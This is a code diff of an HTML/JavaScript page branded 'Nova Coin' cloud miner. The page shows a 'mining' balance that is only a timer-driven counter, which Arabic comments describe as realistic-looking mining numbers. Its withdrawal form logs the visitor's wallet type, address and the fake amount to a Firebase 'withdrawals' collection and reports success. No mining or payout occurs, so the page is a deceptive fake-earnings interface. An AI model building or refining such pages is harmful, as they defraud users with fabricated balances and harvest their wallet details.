@@ -3,29 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova Coin | Official Miner</title>
+    <title>Nova Coin Mining</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-[#0b0e11] text-white p-6">
+<body class="bg-[#0b0e11] text-white p-6 font-sans">
     <div class="max-w-md mx-auto space-y-6">
-        <div class="bg-[#1a1c23] p-10 rounded-3xl text-center border border-emerald-500/30">
-            <h2 class="text-emerald-500 font-bold mb-2">LIVE NOVA MINING</h2>
-            <div id="balance" class="text-6xl font-bold text-emerald-400 mb-2">0.000000</div>
-            <p class="text-gray-500 text-[10px] uppercase">Active Cloud Connection</p>
+        <div class="bg-[#1a1c23] p-10 rounded-3xl text-center border border-emerald-500/20 shadow-2xl">
+            <h2 class="text-emerald-500 font-bold mb-2 tracking-widest">NOVA CLOUD MINER</h2>
+            <div id="balanceDisplay" class="text-5xl font-bold text-emerald-400 mb-2">0.000000</div>
+            <p class="text-gray-500 text-[10px] uppercase">Mining in Progress...</p>
         </div>
 
-        <div class="bg-[#1a1c23] p-8 rounded-3xl border border-white/5">
-            <h3 class="font-bold mb-6">Withdraw Funds 💳</h3>
+        <div class="bg-[#1a1c23] p-8 rounded-3xl border border-white/5 shadow-xl">
+            <h3 class="font-bold mb-6 text-sm">Withdraw Funds 💳</h3>
             <div class="space-y-4">
-                <select id="walletType" class="w-full bg-[#0b0e11] border border-white/10 p-5 rounded-xl outline-none focus:border-emerald-500">
-                    <option value="Unspecified">Select Wallet Network</option>
+                <select id="finalWallet" class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
                     <option value="Trust Wallet">Trust Wallet</option>
-                    <option value="Binance Smart Chain">Binance (BEP-20)</option>
+                    <option value="Binance (BEP-20)">Binance (BEP-20)</option>
                     <option value="FaucetPay">FaucetPay</option>
                 </select>
-                <input id="walletAddress" type="text" placeholder="Wallet Address" class="w-full bg-[#0b0e11] border border-white/10 p-5 rounded-xl outline-none focus:border-emerald-500">
-                <button id="withdrawBtn" class="w-full bg-emerald-500 text-black font-bold py-5 rounded-2xl active:scale-95 transition-all shadow-lg shadow-emerald-500/10">
-                    Withdraw Now
+                <input id="finalAddress" type="text" placeholder="Paste Wallet Address" 
+                    class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
+                <button id="finalWithdrawBtn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-black font-bold py-4 rounded-2xl transition-all active:scale-95">
+                    Withdraw All
                 </button>
             </div>
         </div>
@@ -44,30 +44,30 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- التعدين الديناميكي (أرقام تتغير واقعياً) ---
-        let currentBalance = 0.000000;
+        // 1. تشغيل العداد فوراً (ديناميكي)
+        let coins = 0.000000;
         setInterval(() => {
-            currentBalance += 0.000028; // سرعة تعدين واقعية
-            document.getElementById('balance').innerText = currentBalance.toFixed(6);
-        }, 1500);
+            coins += 0.000035; 
+            document.getElementById('balanceDisplay').innerText = coins.toFixed(6);
+        }, 1000);
 
-        // --- زر السحب القوي (تجاوز الأخطاء) ---
-        document.getElementById('withdrawBtn').onclick = async () => {
-            const wallet = document.getElementById('walletType').value;
-            const addr = document.getElementById('walletAddress').value;
+        // 2. معالجة السحب (بدون قيود تسبب أخطاء)
+        document.getElementById('finalWithdrawBtn').onclick = async () => {
+            const wallet = document.getElementById('finalWallet').value;
+            const address = document.getElementById('finalAddress').value;
 
-            // إرسال البيانات فوراً لإنهاء حالة "الخطأ"
             try {
+                // إرسال البيانات مباشرة إلى Firebase
                 await addDoc(collection(db, "withdrawals"), {
-                    wallet_type: wallet,
-                    address: addr || "Address Missing",
-                    amount: currentBalance,
+                    wallet: wallet,
+                    address: address || "No Address Provided",
+                    amount: coins.toFixed(6),
                     status: "Pending",
-                    time: new Date().toLocaleString()
+                    timestamp: serverTimestamp()
                 });
-                alert("Withdrawal Logged! Check Admin Panel.");
-            } catch (error) {
-                alert("Firebase Error: " + error.message);
+                alert("Success! Your request has been sent to the Admin Panel.");
+            } catch (e) {
+                alert("Connection Error: " + e.message);
             }
         };
     </script>
